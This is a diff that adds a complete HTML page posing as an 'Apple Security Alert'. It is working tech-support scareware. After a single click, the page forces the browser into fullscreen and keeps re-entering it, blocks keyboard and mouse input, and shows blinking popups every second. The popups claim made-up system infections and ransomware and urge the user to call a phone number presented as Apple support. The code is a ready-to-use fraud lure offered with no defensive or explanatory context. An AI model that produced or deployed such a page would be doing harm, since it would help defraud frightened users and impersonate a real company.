@@ -1,0 +1,212 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Apple Security Alert</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            background: linear-gradient(135deg, #1d1d1f, #000);
+            color: #fff;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+            overflow: hidden;
+        }
+
+        #main-content {
+            text-align: center;
+        }
+
+        .apple-header {
+            font-size: 28px;
+            font-weight: 700;
+            margin-bottom: 20px;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            justify-content: center;
+        }
+
+        .apple-logo {
+            width: 36px;
+            height: 36px;
+            background: url('https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg') no-repeat center center;
+            background-size: contain;
+            filter: invert(1);
+        }
+
+        .button {
+            background-color: #007aff;
+            border: none;
+            color: white;
+            padding: 16px 32px;
+            text-align: center;
+            font-size: 18px;
+            border-radius: 12px;
+            cursor: pointer;
+            transition: background-color 0.3s;
+            margin-top: 40px;
+        }
+
+        .button:hover {
+            background-color: #0051a8;
+        }
+
+        .popup {
+            background: #ff3b30;
+            color: white;
+            padding: 30px;
+            border-radius: 15px;
+            text-align: left;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
+            max-width: 600px;
+            width: 90%;
+            animation: popupBlink 1s infinite;
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+        }
+
+        @keyframes popupBlink {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.9; }
+        }
+
+        .security-report {
+            border-left: 3px solid #fff;
+            padding-left: 15px;
+            margin: 15px 0;
+            font-size: 16px;
+        }
+
+        .emergency-contact {
+            background: rgba(255, 255, 255, 0.1);
+            padding: 15px;
+            border-radius: 8px;
+            margin-top: 20px;
+            font-size: 16px;
+        }
+
+        .emergency-contact p {
+            margin: 5px 0;
+        }
+
+        .hidden {
+            display: none;
+        }
+
+/* Audio element (hidden) */
+        #dangerSound {
+            display: none;
+        }		
+		
+    </style>
+</head>
+<body>
+    <div id="main-content">
+        <div class="apple-header">
+            <div class="apple-logo"></div>
+            <span>Apple Security Alert</span>
+        </div>
+        <button class="button" onclick="startSimulation()">Start Security Scan</button>
+    </div>
+
+    <script>
+        let popupInterval;
+        let fullscreenAttempts = 0;
+        const maxAttempts = 1000;
+
+        function startSimulation() {
+            document.getElementById('main-content').classList.add('hidden');
+            enterFullscreen();
+
+            // Start popup loop
+            popupInterval = setInterval(createPopup, 1000);
+
+            // Block all user input
+            const events = ['keydown', 'keyup', 'keypress', 'mousedown', 'mouseup', 'click', 'contextmenu'];
+            events.forEach(eventType => {
+                document.addEventListener(eventType, preventDefaultActions, true);
+            });
+
+            // Monitor fullscreen changes
+            document.addEventListener('fullscreenchange', () => {
+                if (!document.fullscreenElement) {
+                    fullscreenAttempts++;
+                    if (fullscreenAttempts >= maxAttempts) {
+                        exitSimulation();
+                    } else {
+                        enterFullscreen();
+                    }
+                }
+            });
+        }
+
+        function createPopup() {
+            const popup = document.createElement('div');
+            popup.className = 'popup';
+            popup.innerHTML = `
+                <div class="apple-header">
+                    <div class="apple-logo"></div>
+                    <span>CRITICAL SYSTEM THREAT DETECTED</span>
+                </div>
+                
+                <div class="security-report">
+                    <strong>Apple Security Intelligence Report:</strong>
+                    <p>• T2 Security Chip: Integrity Violation<br>
+                    • Secure Enclave: Cryptographic Failure<br>
+                    • XProtect: Signature Database Corrupted<br>
+                    • AMFI: Code Signature Validation Failed<br>
+                    • Neural Engine: Anomaly Detected</p>
+                </div>
+
+                <div class="emergency-contact">
+                    <p>☏ Dial & Report Apple Security Response to prevent further damage:</p>
+                    <p style="font-weight: bold; font-size: 1.2em;">+1 (800) 786-3414</p>
+                    <p>Toll-Free USA Helpline (24/7 Support)</p>
+                </div>
+
+                <p style="margin-top: 15px; font-size: 0.9em;">
+                    *Trojan malware detected on network DNS server. System infected by<br>
+                    Trojan Horse ransomware variant (OSX/Exploit.A). Immediate action required.
+                </p>
+            `;
+
+            document.body.appendChild(popup);
+            setTimeout(() => popup.remove(), 3000);
+        }
+
+        function enterFullscreen() {
+            document.documentElement.requestFullscreen().catch(console.error);
+        }
+
+        function preventDefaultActions(e) {
+            e.preventDefault();
+            e.stopPropagation();
+            return false;
+        }
+
+        function exitSimulation() {
+            clearInterval(popupInterval);
+            document.exitFullscreen();
+
+            // Remove event listeners
+            const events = ['keydown', 'keyup', 'keypress', 'mousedown', 'mouseup', 'click', 'contextmenu'];
+            events.forEach(eventType => {
+                document.removeEventListener(eventType, preventDefaultActions, true);
+            });
+
+            // Show main content
+            document.getElementById('main-content').classList.remove('hidden');
+        }
+    </script>
+	
+	
+</body>
+</html>
